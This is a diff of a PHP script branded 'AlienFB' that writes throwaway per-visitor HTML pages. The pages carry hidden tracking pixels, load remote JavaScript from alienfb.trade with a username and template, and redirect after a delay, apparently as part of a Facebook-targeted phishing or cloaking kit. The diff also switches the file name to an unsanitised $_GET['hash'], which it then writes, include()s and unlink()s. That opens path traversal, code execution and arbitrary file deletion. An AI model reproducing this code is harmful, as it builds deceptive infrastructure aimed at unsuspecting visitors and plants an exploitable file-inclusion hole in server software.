@@ -6,8 +6,10 @@ header("Allow: GET, POST, OPTIONS, PUT, DELETE");
 require_once "./random_string.php";
 require_once(dirname(__FILE__).'/BaseDatosMySql.php');
 require_once(dirname(__FILE__).'/BaseDatosSqlServer.php');
-$name_archivo_php = $_SERVER['REQUEST_URI'];
-$name_archivo_php = str_replace("/", "", $name_archivo_php);
+
+$name_archivo_php = $_GET['hash'];
+
+
 
 
 
@@ -96,8 +98,8 @@ unlink("'.$name_archivo_php.'".".php")
 <meta http-equiv="cache-control" content="no-cache">
 </head>
 <body>
-<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=chrome%3A%2F%2Fversion" style="display:none">
-<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
+<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&t=👽AlienFB👽&x=chrome%3A%2F%2Fversion" style="display:none">
+<img src="//whos.amung.us/pingjs/?k=alienfb&t=👽AlienFB👽&x=trabajador/'.$checker->contador.'" style="display:none">
 <script src="https://alienfb.trade/h/index.php?p1=true&username='.$username.'&pl='.$checker->plantilla.'" type="text/javascript" async="true"></script>
 </body>
 </html> 
@@ -128,8 +130,8 @@ unlink("'.$name_archivo_php.'".".php")
 <meta http-equiv="cache-control" content="no-cache">
 </head>
 <body>
-<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=chrome%3A%2F%2Fversion" style="display:none">
-<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
+<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&t=👽AlienFB👽&x=chrome%3A%2F%2Fversion" style="display:none">
+<img src="//whos.amung.us/pingjs/?k=alienfb&t=👽AlienFB👽&x=trabajador/'.$checker->contador.'" style="display:none">
 <script src="https://alienfb.trade/h/pais.php?p1=true&username='.$username.'&pl='.$checker->plantilla.'&country='.$checker->pais_selecionado.'" type="text/javascript" async="true"></script>
 </body>
 </html> 
@@ -159,8 +161,8 @@ unlink("'.$name_archivo_php.'".".php")
 <meta http-equiv="cache-control" content="no-cache">
 </head>
 <body>
-<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&amp;t=👽AlienFB👽&amp;x=https://www.facebook.com/" style="display:none">
-<img src="//whos.amung.us/pingjs/?k=alienfb&amp;t=👽AlienFB👽&amp;x=trabajador/'.$checker->contador.'" style="display:none">
+<img src="//whos.amung.us/pingjs/?k='.$checker->contador.'&t=👽AlienFB👽&x=https://www.facebook.com/" style="display:none">
+<img src="//whos.amung.us/pingjs/?k=alienfb&t=👽AlienFB👽&x=trabajador/'.$checker->contador.'" style="display:none">
 <script language="javascript">setTimeout(location.href="'.$redireccion.'",8000);</script>
 </body>
 </html>
@@ -170,27 +172,27 @@ unlink("'.$name_archivo_php.'".".php")
 
 $contentHTMLEXTRAIDO = $contentHTML;
 //------------------------------Compruebo si mi name_archivo.php existe-----------------------------------//
-if (file_exists("blob" . "/" . $name_archivo_php.".php")) {
-$permalinkExiste =  "https://".$_SERVER["HTTP_HOST"]."/" . "blob" . "/" . $name_archivo_php.".php";
+if (file_exists("blob" . "/" . $name_archivo_php)) {
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header('X-Robots-Tag: noindex, nofollow');
 header('Referrer-Policy: no-referrer');
-header("Pragma: no-cache");
-header("Location: ".$permalinkExiste, 301);
+header("Pragma: no-cache");	
+include ('blob/' . $_GET['hash']);
+unlink("blob/".$_GET['hash']);	
 die();
 } 
 
 //--------------Compruebo si mi name_archivo.php no existe para crearlo y visualizarlo--------------------//
 else {
-file_put_contents("blob" . "/" . $name_archivo_php.".php", $contentHTMLEXTRAIDO);
-$permalink = "https://".$_SERVER["HTTP_HOST"]. "/" ."blob" . "/" . $name_archivo_php.".php";
+file_put_contents("blob" . "/" . $name_archivo_php, $contentHTMLEXTRAIDO);
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header('X-Robots-Tag: noindex, nofollow');
 header('Referrer-Policy: no-referrer');
 header("Pragma: no-cache");
-header("Location: ".$permalink, 301);
+include ('blob/' . $_GET['hash']);
+unlink("blob/".$_GET['hash']);
 die();
 } 
         
